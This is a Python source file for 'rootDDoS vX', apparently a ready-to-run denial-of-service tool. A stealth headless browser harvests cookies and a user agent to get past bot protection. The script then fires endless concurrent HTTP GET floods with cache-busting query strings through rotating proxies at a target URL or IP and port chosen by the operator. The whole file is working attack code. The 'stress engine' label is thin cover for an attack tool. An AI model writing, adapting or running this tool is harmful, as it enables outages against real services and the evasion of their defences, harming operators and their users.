import asyncio
import aiohttp
from playwright.async_api import async_playwright
from playwright_stealth import stealth_async
import random
import os
import sys

async def get_valid_tokens(target_url):
    print("\n[SYSTEM] INITIALIZING BYPASS ENGINE...")
    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=True)
        context = await browser.new_context()
        page = await context.new_page()
        await stealth_async(page)
        try:
            await page.goto(target_url, wait_until="networkidle")
            await asyncio.sleep(10)
            cookies = await context.cookies()
            user_agent = await page.evaluate("navigator.userAgent")
            cookie_str = "; ".join([f"{c['name']}={c['value']}" for c in cookies])
            await browser.close()
            return cookie_str, user_agent
        except Exception as e:
            print(f"[CRITICAL] BYPASS FAILED: {str(e)}")
            await browser.close()
            return None, None

async def operational_strike(target, cookies, ua, proxy_list, mode):
    headers = {
        "User-Agent": ua if ua else "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Root404/1.0",
        "Accept": "*/*",
        "Connection": "keep-alive"
    }
    if cookies:
        headers["Cookie"] = cookies

    connector = aiohttp.TCPConnector(limit=0, ssl=False)
    async with aiohttp.ClientSession(headers=headers, connector=connector) as session:
        while True:
            proxy = random.choice(proxy_list)
            if not proxy.startswith("http"):
                proxy = f"http://{proxy}"
            try:
                attack_url = f"{target}?s={random.getrandbits(64)}" if mode == "1" else target
                async with session.get(attack_url, proxy=proxy, timeout=5) as resp:
                    print(f"[LOG] STRIKE SUCCESS | STATUS: {resp.status} | NODE: {proxy.split('/')[-1]}")
            except:
                continue

async def main():
    os.system('clear')
    print("="*60)
    print("      rootDDoS vX | PROFESSIONAL STRESS ENGINE")
    print("      OPERATIONAL UNIT: Root404")
    print("="*60)
    print("[1] URL TARGET (L7 Bypass Mode)")
    print("[2] IP TARGET (Direct Attack Mode)")
    mode = input("\n[!] SELECT OPERATION MODE: ")
    if mode == "1":
        target = input("[!] TARGET URL (e.g., https://example.com): ")
    else:
        ip = input("[!] TARGET IP: ")
        port = input("[!] TARGET PORT: ")
        target = f"http://{ip}:{port}"
    print("\n[!] INPUT PROXY LIST (PASTE AND PRESS CTRL+D):")
    input_data = sys.stdin.read()
    proxies = [line.strip() for line in input_data.splitlines() if line.strip()]
    if not proxies:
        print("[CRITICAL] NO PROXY DETECTED.")
        return
    intensity = int(input("\n[!] STRIKE INTENSITY (WORKER COUNT): "))
    cookies, ua = None, None
    if mode == "1":
        cookies, ua = await get_valid_tokens(target)
        if not cookies:
            return
        print("[INFO] BYPASS SUCCESSFUL.")
    tasks = [asyncio.create_task(operational_strike(target, cookies, ua, proxies, mode)) for _ in range(intensity)]
    await asyncio.gather(*tasks)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n[FINALIZE] OPERATION TERMINATED.")
          
